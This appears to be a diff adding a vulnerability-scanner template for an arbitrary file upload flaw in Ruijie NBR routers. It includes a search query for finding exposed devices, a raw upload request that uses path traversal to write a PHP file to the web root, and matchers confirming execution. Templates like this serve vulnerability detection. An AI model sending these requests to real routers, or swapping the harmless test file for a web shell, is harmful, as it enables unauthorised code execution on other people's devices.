@@ -1,0 +1,33 @@
+id: Ruijie-NBR-router-fileupload
+
+info:
+  name: Ruijie NBR router fileupload.php arbitrary file upload vulnerability(锐捷 NBR 路由器 fileupload.php 任意文件上传漏洞)
+  author: linfeng7z
+  severity: critical
+  tags: ruijie,nbr,fileupload
+  metadata:
+    fofa-query: 'app="Ruijie-NBR路由器"'
+
+requests:
+  - raw:
+      - |
+        POST /ddi/server/fileupload.php?uploadDir=../../321&name=123.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/plain, */*; q=0.01
+        Content-Disposition: form-data; name="file"; filename="111.php"
+        Content-Type: image/jpeg
+        
+        <?php phpinfo();?>
+      - |
+        GET /321/123.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+        Connection: close
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body_1, '../../321/123.php') && contains(body_2, 'PHP Version')"
+          - "status_code_1 == 200 && status_code_2 == 200"
+        condition: and
